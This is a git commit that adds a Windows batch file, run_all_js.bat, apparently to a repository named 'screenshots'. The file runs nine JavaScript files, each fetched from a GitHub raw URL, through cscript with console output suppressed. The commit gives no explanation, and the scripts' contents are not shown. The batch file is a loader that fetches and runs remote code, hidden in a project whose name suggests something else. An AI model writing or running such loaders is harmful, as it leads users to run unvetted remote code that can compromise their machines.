1497758e60043a3c02d1b788aef4ec132248e090
cem324 <hvpauxr102@hotmail.com>
2026-09-22 12:28:10 +0000

    Update run_all_js.bat

---
+++ run_all_js.bat
@@ -0,0 +1,10 @@
+@echo off
+cscript //nologo https://raw.githubusercontent.com/cem324/screenshots/main/j1.js
+cscript //nologo https://raw.githubusercontent.com/cem324/screenshots/main/j2.js
+cscript //nologo https://raw.githubusercontent.com/cem324/screenshots/main/j3.js
+cscript //nologo https://raw.githubusercontent.com/cem324/screenshots/main/j4.js
+cscript //nologo https://raw.githubusercontent.com/cem324/screenshots/main/j5.js
+cscript //nologo https://raw.githubusercontent.com/cem324/screenshots/main/j6.js
+cscript //nologo https://raw.githubusercontent.com/cem324/screenshots/main/j7.js
+cscript //nologo https://raw.githubusercontent.com/cem324/screenshots/main/j8.js
+cscript //nologo https://raw.githubusercontent.com/cem324/screenshots/main/j9.js
